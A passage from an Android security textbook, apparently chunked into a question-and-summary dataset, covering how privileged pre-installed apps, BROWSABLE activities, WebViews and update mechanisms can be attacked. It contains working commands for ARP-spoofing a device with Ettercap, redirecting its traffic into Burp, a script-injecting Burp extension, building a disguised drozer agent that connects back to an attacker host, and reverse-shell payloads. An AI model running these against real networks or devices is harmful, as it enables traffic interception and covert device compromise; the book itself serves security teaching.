(NFC Test)\ncom.qualcomm.cabl (Content Adaptive Backlight Settings)\ncom.sec.usbsettings (USBSettings)\ncom.samsung.android.app.assistantmenu (Assistant menu)\ncom.sec.android.app.wfdbroker (com.sec.android.app.wfdbroker)\ncom.coolots.chaton (ChatON Voice & Video Chat)\ncom.sec.android.app.parser (Factory Mode)\ncom.sec.android.inputmethod (Samsung keyboard)\ncom.dsi.ant.server (ANT HAL Service)\ncom.samsung.SMT (Samsung text-to-speech engine)\ncom.sec.knox.containeragent (KnoxMigrationAgent)\ncom.sec.android.easysettings (Easy settings)\ncom.samsung.android.app.filterinstaller (Filter Installer)\ncom.sec.android.omc (OM Customize)\ncom.sec.android.app.SecSetupWizard (Samsung SetupWizard)\ncom.sec.enterprise.mdm.services.simpin (Enterprise Sim Pin Service)\ncom.sec.android.providers.security (Security Storage)\ncom.sec.android.app.factorykeystring (DeviceKeystring)\ncom.sec.android.app.hwmoduletest (HwModuleTest)\ncom.sec.automation (TetheringAutomation)\ncom.sec.app.RilErrorNotifier (RilNotifier)\ncom.sec.pcw.device (Remote Controls)\ncom.samsung.helphub (Help)\ncom.sec.android.app.wlantest (WlanTest)\ncom.android.location.fused (Fused Location)\ncom.wssnps (wssyncmlnps)\ncom.sec.modem.settings (SilentLogging)\ncom.policydm (??Security policy updates)\ncom.sec.tcpdumpservice (TcpdumpService)\ncom.sec.knox.bridge (KNOX)\ncom.sec.android.preloadinstaller (Application installer)\ncom.samsung.android.providers.context (Context Service)\ncom.samsung.android.mdm (MDMApp)\ncom.qualcomm.location (LocationServices)\ncom.qualcomm.snapdragon.digitalpen (DigitalPenSDK)\ncom.samsung.android.MtpApplication (MTP application)\ncom.sec.android.app.personalization (Perso)\ncom.samsung.android.app.colorblind (Colour adjustment)\ncom.sec.knox.knoxsetupwizardclient (KNOX SetupWizardClient)\ncom.sec.dsm.system (DSMLawmo)\ncom.sec.android.Kies (USB settings)\ncom.sec.knox.seandroid (Knox Notification Manager)\nA staggering 66 applications run as the system UID. Performing this test on any device where a manufacturer\nhas added a substantial set of its own applications will yield similar results. If any application running as the\nsystem user contains a vulnerability, the security of the device would be severely crippled. Running applications\nas the system user not only contradicts the “one application equals one user” model but also affords most\napplications more power than they need. Generally only applications that need to be able to make significant\nchanges not directly supported by standard permissions or filesystem capabilities should be granted this access.\nThis section presented two examples of ways that applications can be considered powerful. However, the\nconcept of power is relative to the task you are trying to achieve. If your goal is to steal data from an application\nand exploiting something on a device allows access to this data, this may also be seen as powerful. Searching for\npowerful applications is only one way to prioritize the review of applications. Another way could be to check all\napplication certificates and prioritize the review of applications that are not made by Google. This is using the\nassumption that third-party applications are of lower code quality than Google applications. There could also be\nmultiple other ways to prioritize the review of applications and this comes down to which approach you think\nwill yield the best results on the particular device.\nFinding Remote Attack Vectors\nThis section explores some ways to remotely compromise an Android device by exploiting an application. This\nsection does not discuss the use of malware downloaded and installed by the user as an attack vector because\nthis is fairly obvious. When you consider computer systems in general, multiple attack vectors can allow you to\ngain access to a system remotely. However, these vulnerabilities can be classed into two high-level categories:\nserver-side exploitation and client-side exploitation.\nServer-side exploitation is when someone gains access to a computer through a listening service on that host,\nwhich can mean anything from a web server to an auxiliary piece of software that listens on a port. The point\nhere is that an attacker can initiate the connection with the listening service.\nClient-side exploitation is exploiting a piece of software installed on a host, which generally requires a degree of\nuser interaction. Browsers, document readers, and email clients are vulnerable to this type of attack. Android\ndevices contain many installed applications that could be vulnerable to this attack vector.\nBrowsers and Document Readers\nMost client-side exploitation occurs through vulnerabilities in web browsers or document readers. These\nattacks, which have been around for years, do not seem to be decreasing for the following reasons:\nBrowsers and document readers both have complex parsers that are normally implemented in native code.\nThey are both used in everyday computing.\nThey both contain dynamic scripting environments inside them.\nProfessional bug hunters build software fuzzers that target popular web browsers and document readers to find\nexploitable vulnerabilities in them, and Android applications are not an exception.\nSome Android devices come with document readers and other authoring applications installed by default. These\ncan be found by observation or by looking for relevant activity intent filters for common document types. For\ninstance, on a Samsung device the following application is available by default to read PDF documents:\ndz> run app.activity.forintent --action android.intent.action.VIEW\n--mimetype application/pdf\nPackage: com.infraware.polarisviewer5\ncom.infraware.polarisoffice5.OfficeLauncherActivity\ndz> run app.package.info -a com.infraware.polarisviewer5\nPackage: com.infraware.polarisviewer5\nApplication Label: POLARIS Office Viewer 5\nProcess Name: com.infraware.polarisviewer5\n...\nThe app.activity.forintent module in drozer was used to find all activities that have an intent filter for the\nMIME-type application/pdf. You can find applications that handle other file types in a similar fashion.\nAfter you have discovered all browsers and document readers on a device, you can start trying to finding\nvulnerabilities in them. Often the parsers for these types of applications are written in native code for speed\noptimization. This means that you would need to understand how to fuzz or reverse engineer native code to find\nvulnerabilities, and these topics are outside the scope of this book. Any other application that uses native code\nthat takes untrusted input from a remote source would be classed in the same attack vector.\nBROWSABLE Activities\nActivities declared in the manifest can have an intent filter that allows it to be invoked from a web browser. This\nis done by specifying a category of android .intent.category.BROWSABLE. This intent filter is normally used by\napplications to allow users to open appropriate content inside an installed application rather than in the\nbrowser. App stores installed on the device use this functionality to automatically invoke the store from a web\npage and allow the user to install an application.\nThe following is an example of an intent filter within the manifest of a rogue drozer agent's (discussed later)\nthat allows an activity to be invoked from a browser:\n<activity\nandroid:name=\"com.mwr.dz.PwnActivity\">\n<intent-filter>\n<action android:name=\"android.intent.action.VIEW\" />\n<category android:name=\"android.intent.category.DEFAULT\" />\n<category android:name=\"android.intent.category.BROWSABLE\" />\n<data android:scheme=\"pwn\" />\n</intent-filter>\n</activity>\nThis manifest declaration shows that any web browser that tries to load a URI starting with pwn:// will open\nthis activity. In the past you could start an application with a BROWSABLE activity by loading an iframe that loads\nfrom the custom scheme. However, launching via an iframe is no longer possible in versions of Chromium\nincluding 25 and later, and so the URI needs to be visited directly by the user or by redirecting through\nJavaScript. It now requires invocation that directs the user to the exact resource. If this resource does not exist\non the device, the web page will no longer stay functioning because the browser will throw an invalid URI error.\nThe later section “BROWSABLE URI Injection” covers the exploitation of BROWSABLE activities.\nBROWSABLE activities can also be invoked by making use of an experimental specification supported by Chrome\ncalled web intents. These allow the invocation of BROWSABLE activities in a structured and more useful manner.\nThis access is achieved through a URI starting with intent:// that supports the use of more attributes of an\nIntent object as well as extras. The two ways to invoke the drozer activity are using its defined scheme directly\nand using a web intent:\n<a href=\"pwn://me\">Start drozer - technique 1<a>\n<a href=\"intent://me/#Intent;scheme=pwn;end\">Start\nDrozer - technique 2</a>\nTo find more information about the web intents project and the available parameters go to\nhttps://developer.chrome.com/multidevice/android/intents. The implementation of web intents was\nattacked at Mobile Pwn2Own 2013 (see http://www.pwn2own.com/2013/11/local-japanese-team-exploits-\nmobile-applications-install-malware-samsung-galaxy-s4/). The same team that performed this exploit\ncreated an interesting analysis of the implementation of web intents in different browsers at\nhttp://www.mbsd.jp/Whitepaper/IntentScheme.pdf. Some browsers, such as Chrome, limit the invocation of\nactivities to only ones that are BROWSABLE and do not allow the component to be explicitly set. However, other\nbrowsers do not enforce this and any activity can be opened with the given intent. You can read about a\ntechnique involving intent selectors to bypass even this restriction in Chrome at http://developer\n.android.com/reference/android/content/Intent.html#setSelector(android .content.Intent). This opens a\nhuge attack vector for finding activities that perform tasks automatically in their onCreate() method using the\nsupplied bundle. Assuming that all browsers fix the ability to invoke arbitrary activities and only allow\nBROWSABLE activities, a significant attack vectors still exists.\nA drozer module at scanner.activity.browsable is available to find all BROWSABLE activities on a device. Running\nit on a Samsung Galaxy S5 reveals the following snipped output:\ndz> run scanner.activity.browsable\n...\nPackage: com.sec.android.app.shealth\nInvocable URIs:\nshealth://\ncom.sec.android.app.shealth.sleepmonitor://main\nClasses:\ncom.sec.android.app.shealth.SplashScreenActivity\ncom.sec.android.app.shealth.sleepmonitor.SleepMonitorActivity_Base\n...\nPackage: com.vodafone.cloud\nInvocable URIs:\nintent://\nhttp://vodafone.com/cloud (PATTERN_LITERAL)\nClasses:\ncom.newbay.syncdrive.android.ui.gui.activities.SplashLogoActivity\nPackage: com.sec.android.cloudagent\nInvocable URIs:\ndb-qp95n66cz21kx96://\nClasses:\ncom.dropbox.client2.android.AuthActivity\nPackage: com.sec.android.app.voicenote\nInvocable URIs:\nsherif-activity://nuanceinfo\nClasses:\ncom.sec.android.app.voicenote.library.subactivity\n.VNPolicyInfoActivity\n...\nPackage: com.samsung.groupcast\nInvocable URIs:\ngroupplay://\nhttp://gp.samsung.com\nhttps://gp.samsung.com\nClasses:\ncom.samsung.groupcast.application.start.StartActivity\n...\nPackage: com.sec.enterprise.knox.cloudmdm.smdms\nInvocable URIs:\nsmdm://\nClasses:\n.ui.LaunchActivity\n...\nPackage: com.osp.app.signin\nInvocable URIs:\nsamsungaccount://MainPage\nClasses:\n.AccountView\nPackage: com.sec.android.app.billing\nInvocable URIs:\nAPKUPReadersHub://\nAPKUPLearningHub://\nAPKUPMediaHub://\nAPKUPVideoHub://\nAPKUPMusicHub://\nAPKUPSamsungCloud://\nAPKUPSamsungApps://\nClasses:\ncom.sec.android.app.billing.UnifiedPaymentPGActivity\n...\nAll the activities shown can be invoked from the web browser by an arbitrary website. This shows a clear set of\npossible attack vectors that someone looking to find vulnerabilities in this device could explore. In fact, later in\nthis chapter in the section “BROWSABLE URI Injection” we explore a vulnerability in the activity that handles\nthe smdm:// URI scheme.\nCustom Update Mechanisms\nApplications that hold the INSTALL_PACKAGES permission are immediately a high-value target and should be\ninvestigated. These applications often handle their own updates rather than doing so through the Play Store.\nThe developers at device manufacturers may feel that it is a hassle for users to go to the Play Store or simply feel\nthat custom update mechanisms are easier to manage from their side. Whatever the reasons, these applications\ncan contain vulnerabilities that allow for the arbitrary installation of packages. Thoroughly investigate code that\ninstalls a new package to see whether an external entry point into this code exists that can be abused.\nOften when these applications start, they check to see whether an update is available on some remote web\nserver. If there is, the APK is downloaded and installed. The communication channel used for this download is a\ncrucial aspect of security for this application. If it is downloading the new APK in clear text, or the SSL certificate\nis not properly validated, an attacker could perform a man-in-the-middle attack to replace this APK file in\ntransit. It is unlikely that an attacker would target an individual on a wireless network and wait for him or her to\nopen a vulnerable application. However, doing this at an airport or busy wireless hotspot on a larger scale may\nprove fruitful.\nRemote Loading of Code\nAndroid allows applications to load new code at runtime using the Java Reflection API. Loading entirely new\nclasses or instantiating new objects and interacting with them is possible. This is the technique drozer uses for\ninteractions between the console and the agent.\nIf application developers use these mechanisms, they should be aware of where they are loading new code from.\nLoading new code from remote sources over a channel that is not secured is a recipe for enabling remote code\nexecution.\nUsually, developers use the DexClassLoader class to load new code into their application. The constructor of this\nclass looks like this:\nDexClassLoader (String dexPath, String dexOutputDir, String libPath,\nClassLoader parent)\nAnother problem that is considered a local vulnerability is loading classes specified by the dexPath from a\nlocation on the device that can be overwritten by other applications. Additionally, dexOutputDir is a location\nspecified by the developer where the ODEX file must be placed. If this ODEX is replaced with a malicious\nversion, then when the code is loaded again, the attacker's code will also be loaded. If another vector exists to\nreplace ODEX files that are loaded by an application, and the application can be invoked (for example, through\nweb intents from the web browser), then executing code remotely could be possible.\nWebViews\nChapter 7 looked at issues that can affect WebViews and came to the conclusion that the worst mistake a\ndeveloper can make is loading content over HTTP inside a WebView. The following combination is a recipe for\ndisaster and would allow the application to be exploited for code execution on the device using CVE-2012-6636:\nUsing a WebView\nDefining a JavaScript interface\nLoading from a cleartext source or having SSL bypass code\nTargeting API versions prior to 17 or using an Android version earlier than 4.2\nThis combination is the foundation of two of the attacks presented later in this chapter. A warning sign for a\npossibly exploitable chain of vulnerabilities on a device that is implementing a custom app store is when it\nmakes use of a WebView. If at any point you are able to inject your own JavaScript into this WebView, you will\nlikely be able to invoke the installation functionality and install an arbitrary package.\nListening Services\nIf you perform a port scan of an Android device, you are unlikely to find any listening ports. If you do, these\nwould have to be mapped to the application that owns it in order to interrogate the section of code handling the\nnetworking. To find any listening TCP ports on a device that you have connected to your computer, perform the\nfollowing command:\n$ adb shell netstat -antp | grep LISTEN\nFor instance, when you use the embedded server from within drozer, the output looks as follows:\n$ adb shell netstat -antp | grep LISTEN\ntcp6 0 0 :::31415 :::* LISTEN\nFinding a listening port on a device is the least likely scenario, but a listening service may be invoked through\nanother vulnerability. The creation of listening ports on the device also becomes more likely when the user uses\nfunctionality like Android Beam, S-Beam, Bluetooth, or any other Personal Area Network (PAN). When a PAN is\ninitiated between two devices listening services are commonly started so communications can take place over\nthe link. Messaging Applications Any application that handles data from external sources is a possible entry\npoint for attack. The following are some examples of messaging functionality that could be prone to attack:\nShort Message Service (SMS)\nMultimedia Messaging Service (MMS)\nCommercial Mobile Alert System (CMAS)\nEmail clients\nChat clients\nApplications that handle incoming SMS, MMS, or CMAS could contain elements that are performed in native\ncode (such as parsing of emoticons) or handled by a third-party application. Messages would have to be traced\nfrom their entry point in code through all possible routes in the code. This would likely be an unfruitful task.\nHowever, over the years people have found vulnerabilities in the oldest, most trusted code in existence. So\nvulnerabilities could still be uncovered in this functionality on Android.\nThird-party email and chat clients would be more likely sources of vulnerabilities. Decompiling these\napplications and performing a full review on them as per Chapter 7 could yield many possible vulnerabilities in\nthese applications. One attack vector that comes to mind is if an email or chat client were loading received",
    "question": "What are some methods attackers can use to exploit vulnerabilities in pre-installed Android applications to gain access to the device without requiring root access?",
    "summary": "This chapter discusses how attackers can identify and exploit vulnerabilities in Android pre-installed applications to gain access to devices. It highlights the importance of finding powerful apps with high privileges, such as the ability to install packages, and explores methods like BROWSABLE activities and custom update mechanisms for exploitation. The chapter also covers remote attack vectors, including vulnerabilities in web browsers and document readers, as well as the use of web intents and listening services to compromise devices."
  },
  {
    "start": 44,
    "end": 46,
    "text": "messages in a WebView. This would certainly be interesting behavior and could mean that the application is\nprone to attack via a JavaScript injection or misconfigured attributes in the WebView.\nFinding Local Vulnerabilities\nChapter 7 explored the many different types of vulnerabilities that can be present inside an Android application.\nFinding vulnerabilities in applications on a device is no different. However, to be time efficient a faster\nautomated approach must be adopted instead of manual review.\nA good first step is to download all installed applications on the device and convert them to readable source\ncode. You can do this using the decompilation techniques discussed in Chapter 6 in the “Reverse Engineering\nApplications” section. You could then do simple searches using grep to identify some low-hanging fruit. What\nyou determine as low-hanging fruit would differ according to your experience in assessing devices. However,\nprioritizing the search for vulnerabilities in a calculated way would be wise.\nThe scanner modules present in drozer can help you identify issues with very little effort. These modules are\ndesigned to be performed on a whole device's worth of applications at one time to look for a particular issue. For\nexample, using the scanner.provider.injection module to look for SQL injection in all content providers on a\nNexus 7 tablet reveals the following:\ndz> run scanner.provider.injection\nScanning com.android.backupconfirm...\nScanning com.android.packageinstaller...\nScanning com.android.providers.userdictionary...\nScanning com.android.providers.downloads.ui...\n...\nNot Vulnerable:\ncontent://com.android.gmail.ui/\ncontent://com.google.android.libraries.social.stream.content\n.StreamUris/activity_view/activity\ncontent://subscribedfeeds/deleted_feeds\n...\nInjection in Projection:\ncontent://settings/system/notification_sound\ncontent://settings/system/ringtone\ncontent://settings/gservices\ncontent://settings/system/notification_sound/\ncontent://settings/gservices/\ncontent://com.google.settings/partner/\ncontent://settings/system/alarm_alert/\ncontent://com.google.settings/partner\ncontent://settings/system/ringtone/\ncontent://settings/system/alarm_alert\nInjection in Selection:\ncontent://com.android.bluetooth.opp/live_folders/received\ncontent://settings/gservices\ncontent://settings/gservices/\ncontent://com.google.settings/partner/\ncontent://com.google.settings/partner\ncontent://com.android.bluetooth.opp/live_folders/received/\nThese injection points provide no significant advantage to an attacker but are enough to convey the scale of\nsearches that a scanner module can perform to find vulnerabilities.\nExploiting Devices\nIt should be abundantly clear that many classes of vulnerabilities can be discovered and exploited on an Android\ndevice. Vulnerabilities can be classed into two generic classes: remote and local.\nTypically, a remote exploit allows an attacker to gain a foothold on the target device. Access can occur through a\nmultitude of attack vectors such as software exploits, man-in-the-middle attacks, or malware. Attacks can come\nfrom any of the inputs into a device, which is an ever-growing number of technologies. Standard wireless\nfunctionality on devices includes cellular services, Wi-Fi, NFC (Near Field Communication), and Bluetooth.\nThese are all valid attack paths for an attacker to pursue for exploitation. A local exploit is one that requires a\nfoothold on the device already. Exploits of this type could attempt to escalate the privileges of the malicious\ncode or perform an action on an application that was not intended.\nUsing Attack Tools\nThis section discusses some attack tools that will be useful background knowledge for the rest of the chapter.\nThese tools and their functionality will be the equivalent of a surgeon's scalpel for finding routes an attacker\nmight take to compromise a device.\nEttercap\nEttercap is the de facto standard for performing man-in-the-middle attacks on a network. It includes tools for\nperforming ARP poisoning, DNS spoofing, and many other techniques that allow you to control your victim's\ntraffic on the same network. The project page is at http://ettercap.github.io/ettercap/. To install it from the\nrepositories in Ubuntu you can use the following command:\n$ sudo apt-get install ettercap-graphical\nHowever, the repositories often lag behind the latest version. We recommend that you compile the latest\nversion available on the project page from source. After downloading the tarball, install the required\ndependencies per the documentation. Then, untar the source directory and perform the compilation of Ettercap:\n$ cd ettercap-0.8.1\n$ mkdir build\n$ cd build\n$ cmake ..\n-- The C compiler identification is GNU 4.8.2\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Check if the system is big endian\n-- Searching 16 bit integer\n-- Looking for sys/types.h\n-- Looking for sys/types.h - found\n-- Looking for stdint.h\n...\n-- Looking for strndup - found\n-- Found LIBNET: /usr/lib/x86_64-linux-gnu/libnet.so\n-- Found PCRE: /usr/lib/x86_64-linux-gnu/libpcre.so\n-- Performing Test HAVE_MUTEX_RECURSIVE_NP\n-- Performing Test HAVE_MUTEX_RECURSIVE_NP - Success\n-- Found BISON: /usr/bin/bison (found version \"3.0.2\")\n-- Found FLEX: /usr/bin/flex (found version \"2.5.35\")\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/tyrone/ettercap-0.8.1/build\n$ sudo make install\n...\nA successful compilation and installation are all that is required to start performing man-in-the-middle attacks.\nFinding Android devices on a wireless network that you are connected to is not a simple task. They have no real\nidentifiable attributes on a network that allow for easy fingerprinting. A best-effort approach would be to look\nout for MAC addresses that are associated with manufacturers that are known to make Android devices. This is\nstill a sub-optimal approach though because not all Organizationally Unique Identifiers (OUIs) are recognized\nby nmap (see http://nmap.org/). Using a ping sweep with nmap will show a mapping of discovered MAC\naddresses and their manufacturers:\n$ sudo nmap -sP 192.168.1.0/24\nStarting Nmap 6.40 ( http://nmap.org ) at 2014-11-08 16:52 SAST\nNmap scan report for router (192.168.1.1)\nHost is up (0.0019s latency).\nMAC Address: D4:CA:6D:AE:F8:76 (Routerboard.com)\n...\nNmap scan report for 192.168.1.100\nHost is up (-0.065s latency).\nMAC Address: 40:0E:85:56:62:C9 (Samsung Electro Mechanics co.)\n...\nNmap scan report for 192.168.1.109\nHost is up (0.033s latency).\nMAC Address: 5C:0A:5B:53:AC:1F (Samsung Electro-mechanics CO.)\n...\nNmap scan report for 192.168.1.117\nHost is up (-0.060s latency).\nMAC Address: 30:85:A9:60:D2:A1 (Asustek Computer)\n...\nNmap done: 256 IP addresses (13 hosts up) scanned in 4.21 seconds\nThe network shown here has two Samsung devices and a Nexus 7 tablet that is made by Asus. You can use the\nfollowing command on Ettercap to intercept the connection between the network gateway and the Nexus 7\ntablet:\n$ sudo ettercap -i wlan0 -Tq -M ARP:remote /192.168.1.1/ /192.168.1.117/\nettercap 0.8.1 copyright 2001-2014 Ettercap Development Team\nListening on:\neth0 -> 80:FA:5B:07:23:B3\n192.168.1.102/255.255.255.0\nfe80::82fa:5bff:fe07:23b3/64\nSSL dissection needs a valid 'redir_command_on' script in the etter.\nconf file\nPrivileges dropped to UID 0 GID 65534...\n33 plug-ins\n42 protocol dissectors\n57 ports monitored\n19839 mac vendor fingerprint\n1766 tcp OS fingerprint\n2182 known services\nScanning for merged targets (2 hosts)...\n* |==================================================>| 100.00 %\n1 hosts added to the hosts list...\nARP poisoning victims:\nGROUP 1 : 192.168.1.1 D4:CA:6D:AE:F8:76\nStarting Unified sniffing...\nText only Interface activated...\nHit 'h' for inline help\nNOTE\nNot specifying the interface in Ettercap may result in an error saying \"FATAL: ARP poisoning needs a non-\nempty hosts list.\" This error occurs because Ettercap is trying to scan for hosts on an interface you may\nnot be using for your target network. Therefore, always specifying an interface is recommended.\nFollowing these steps allows you to ARP spoof between the gateway and the device at 192.168.1.117. Opening a\npacket sniffer such as Wireshark and capturing on “any” interface reveals all traffic, even that coming from your\nvictim device. You can now manipulate any aspect of this device's traffic. Some useful plug-ins come pre-\ninstalled inside Ettercap, such as DNS spoofing. Being able to effectively manipulate another user on the same\nnetwork's traffic is not only an essential skill for an Android hacker, but also for any competent network\npenetration tester.\nBurp Suite\nIn addition to Burp Suite being the de facto web application testing tool, it is also a brilliant tool to use when\nperforming a man-in-the-middle attack. After a successful traffic interception attack against a device we will be\nusing it to proxy and view web traffic. If a device's traffic is already coming through your computer, you can set\nup routing rules to redirect traffic to a certain port through the Burp proxy.\nSetting Up Burp for Network Interception\nTo set up interception of web traffic destined to port 80, perform the following:\n1. Open Burp and go to Proxy ➢ Options.\n2. Add a new proxy listener.\n3. In the Binding tab specify the port as 8080 and bind to all interfaces.\n4. In the Request handling tab, tick Support Invisible Proxying.\n5. In the Certificate tab select Generate CA-Signed per-host Certificates.\nBurp is now set up correctly to transparently proxy traffic. Now use an iptables rule to redirect incoming traffic\npassing through the computer destined for port 80 to the Burp listener at port 8080. You can do this as follows:\n$ sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j\nREDIRECT --to-port 8080\nYou are now proxying cleartext HTTP traffic from this device and viewing it in the HTTP history tab in Burp.\nMake sure that the interception button is off in Burp otherwise you will be blocking all web traffic from passing\nthrough Burp to the intended recipient. You can use the same command to send HTTPS traffic to Burp using --\ndport 443 instead of --dport 80. However, the user will receive certificate warnings when browsing HTTPS\nwebsites. SSL validation will also fail inside applications unless the developer has conveniently nullified these\nchecks. In general, receiving certificate warnings causes the user to become more suspicious and may result in\ntheir disconnecting from the network.\nUsing Burp Extensions\nBurp enables a hacker to see all web traffic coming from a device when performing a man-in-the-middle attack.\nCombining this with Burp custom extensions means that it is the perfect attack tool for manipulating web traffic\nto and from a server. Many of the attacks presented later in the section under “Man-in-the-Middle Exploits” rely\non being able to inject new content into an application's HTTP stream. In preparation for this, we will create an\nexample Burp extension that injects a JavaScript alert() into received HTML pages on the fly.\nBurp must be set up correctly to be able to handle Python modules. The Extender tab in Burp under Options has\na section called Python Environment. Using Python extensions in Burp requires the standalone Jython JAR to\nbe specified. You can download it from http://www.jython.org/downloads.html. Remember to download the\nStandalone JAR version of Jython. After it is downloaded point Burp to the location of the JAR under the\nPython Environment section in Burp. Python extensions can be used within Burp. A basic module named\ninject.py that injects a JavaScript alert into the HTTP response is shown here with inline comments:\nfrom burp import IBurpExtender, IHttpListener\nclass BurpExtender(IBurpExtender, IHttpListener):\ndef registerExtenderCallbacks(self, callbacks):\n# Make callbacks available to whole class\nself._callbacks = callbacks\n# Make helpers available to whole class\nself._helpers = callbacks.getHelpers()\n# Set name\ncallbacks.setExtensionName(\"Inject JavaScript Alert\")\n# Register HTTP listener\ncallbacks.registerHttpListener(self)\nreturn\ndef processHttpMessage(self, toolFlag, messageIsRequest,\nmessageInfo):\n# Only process responses\nif not messageIsRequest:\n# Get response\nresponse = messageInfo.getResponse()\nresponseStr = self._callbacks.getHelpers()\n.bytesToString(response)\nresponseParsed = self._helpers.analyzeResponse(response)\nbody = responseStr[responseParsed.getBodyOffset():]\nheaders = responseParsed.getHeaders()\n# Inject <script> into <head>\nchangedBody = body.replace(\"<head>\",\n\"<head><script>alert('w00t')</script>\")\nchangedBodyBytes = self._callbacks.getHelpers()\n.stringToBytes(changedBody)\nhttpResponse = self._callbacks.getHelpers()\n.buildHttpMessage(headers, changedBodyBytes);\n# Set the response if the body changed and alert\nif body != changedBody:\nmessageInfo.setResponse(httpResponse)\nself._callbacks.issueAlert(\"Injected JavaScript!\")\nYou can load this module by going to the Extender tab and adding the module. Every time an alert is injected\ninto the HTTP response, a log entry is added in the Alerts tab inside Burp. You are going to be making extensive\nuse of Burp extensions, so tinkering with them to understand how they work would be best.\ndrozer\ndrozer offers features to help compromise devices remotely, through means of exploiting applications on the\ndevice or performing attacks that involve a degree of social engineering. drozer provides a framework for the\nsharing of exploits and reuse of high-quality payloads. It also allows the sharing of post-exploitation modules\nthrough a central online repository.\nUp until now you've probably been running drozer in “direct mode” where you run the agent's embedded server\nand connect directly to the device. This agent also had a single permission: INTERNET. drozer supports another\nmode of operation dubbed “infrastructure mode.” In infrastructure mode, you run a drozer server either on your\nnetwork or on the Internet that provides a rendezvous point for your consoles and agents and routes sessions\nbetween them. This mode of operation is most useful when you are deploying a payload onto a remote device\nthat must connect back to your server.\nHere are all the subcommands available when running drozer:\n$ drozer\nusage: drozer [COMMAND]\nRun `drozer [COMMAND] --help` for more usage information.\nCommands:\nconsole start the drozer Console\nmodule manage drozer modules\nserver start a drozer Server\nssl manage drozer SSL key material\nexploit generate an exploit to deploy drozer\nagent create custom drozer Agents\npayload generate payloads to deploy drozer\nUsing the Server\nYou can start a drozer server by simply running the following:\n$ drozer server start\nStarting drozer Server, listening on 0.0.0.0:31415\nTo change the default listening port you append --port <port> to the command. The drozer server is the central\npoint of contact for any payload and so it has to be multi-faceted. It can speak many protocols depending on the\ncode connecting to it; for instance:\ndrozerp—If a drozer agent connects then it uses drozer's custom binary protocol.\nHTTP—If a web browser connects, it serves resources like a standard web server.\nBytestream—If a byte is sent at the beginning of a transmission, it streams a configurable resource in\nresponse.\nShell server—If an “S” is sent as the first byte, the connection is saved as a shell that the attacker can use.\nThe exploitation flow with drozer makes heavy use of this server—from hosting the resources required to\nsuccessfully compromise a device, to catching all kinds of reverse connections after exploitation has been\nsuccessful. The HTTP web server code inside the drozer server also has a host of other features like:\nUser-agent checking—This locks the response of a web resource to only matching user agents.\nConfigurable MIME-types—Web resources can be set with a certain MIME-type.\nCustom server headers—Responses on web resources can include custom server headers.\nResource path wildcards—Use wildcards when specifying a resource path for maximum flexibility.\nResource path counters—This allows the exploitation payload to retrieve how many times a certain\nresource has been downloaded from the server.\nRogue Agents\nPrevious chapters have focused on using drozer as an assessment tool, which mostly required the agent to have\nminimal permissions. The requirements for an exploitation payload are a little different. Some of the main\ndifferences between a standard drozer agent and its darker rogue agent are as follows:\nRogue agents do not have a main activity. Therefore, there is no launcher icon for it.\nIts application label is “sysplug-in” and not “drozer agent”. This is so that when it is installed it is not obvious\nwhat it is.\nRogue agents by default request many permissions. This is so that when it gets installed on a device it is able\nto perform post-exploitation without hindrance.\nTo build a rogue drozer agent that connects back to 192.168.1.112 on port 80, you can use the following\ncommand:\n$ drozer agent build --rogue --server 192.168.1.112:80\nDone: /tmp/tmpgm4hq7/agent.apk\nA rogue agent has to be invoked by the exploit that installed it. It does not have a launcher icon and so the user\ncannot invoke it. They can be invoked with one of the following methods depending on the device:\nStarting the service at com.mwr.dz/.Agent\nStarting the activity by viewing pwn:// in a browser\nSending a broadcast with an action of com.mwr.dz.PWN\nBuilt-In Exploits\ndrozer exploits are modules that in some way allow you to get code execution on a device. To get a list of all\navailable exploits inside drozer, issue the following command:\n$ drozer exploit list\nExploitation modules are ones that specify the following attribute in their code:\nmodule_type=\"exploit\"\nThis makes the module available outside of the drozer console and available under the drozer exploits list. This\nprovides a logical separation between modules that can be run when access has been obtained on a device and\nthose that can be used to get code execution on a device. We make extensive use of exploits in this chapter and\nexplain their usage in their appropriate sections.\nUsing Standard Payloads\ndrozer payloads are the raw commands or shell code that you can embed inside an exploit to integrate with the\ndrozer exploitation flow. The following payloads were available at the time of writing:\n$ drozer payload list\nshell.reverse_tcp.armeabi Establish a reverse TCP Shell (ARMEABI)\nweasel.reverse_tcp.armeabi weasel through a reverse TCP Shell (ARMEABI)\nweasel.shell.armeabi Deploy weasel, through a set of Shell\ncommands (ARMEABI)\nWhen choosing a payload, making use of weasel, drozer's multi-purpose payload, is good practice. Weasel\nautomatically tries to gain maximum leverage on a device and set up the exploited application to connect back to\nthe drozer server. Weasel tries a number of techniques to run a drozer agent after exploitation has taken place:\nIf you have exploited a privileged application, weasel will attempt to install a full rogue agent APK and start\nit.\nWeasel performs a technique that replaces the running process with a drozer agent (in JAR format) using\nthe app_process binary present on Android devices. This method causes the drozer agent to lose Context. The\nconsequences of this are shown in relevant sections in the remainder of the chapter. This agent without\nContext is referred to as a limited agent.\nWeasel also provides a normal reverse shell connection back to the drozer server, in case the other\ntechniques have failed. Obtaining a drozer session is much better than obtaining a normal shell though\nbecause of all the additional functionality it provides.\nWeasel may sometimes fail to load a limited agent using the app_process method because this technique is very\nsensitive to having the correct environment variables set, particularly the BOOTCLASSPATH variable. A lot of the\ntime when weasel has been loaded, the exploitation technique used has trashed the process's environment\nvariables and so weasel has to do some guesswork to reconstruct the BOOTCLASSPATH. This method also does not\nallow the agent to obtain the exploited application's Context, which limits access to standard Android features.\nMitM Helper Extension for Burp\nPerforming a man-in-the-middle attack as presented earlier in this chapter is a powerful method for\ncompromising applications. To help better integrate drozer into this process, a Burp extension was created for\nperforming common attack tasks. It is located inside the installed drozer directory:\n/src/drozer/lib/scripts/mitm-helper.py. You load it by going to the Extensions ➢ Add button and then\nselecting the file. This extension relies on Jython being properly set up in the Extender ➢ Options tab. We\nexplore the use of this extension in the “Man-in-the-Middle Exploits” section later in this chapter.\nExplanation of Privilege Levels\nBefore delving into the exploitation of devices, knowing what kind of access an attacker can obtain on devices\nand what privilege level is associated with this access is useful.\nNon-System Application without Context\nThe classic Android hacking demonstration shown on the Internet is visiting a website and an attacker gaining\nshell access to a device. With this access he obtains the privilege level of the compromised application and can\nnavigate the filesystem under the user context of the browser. This level of access does not allow the attacker to\ninvoke functionality on the OS that uses any Java libraries. This means that if the compromised application has\nbeen granted the 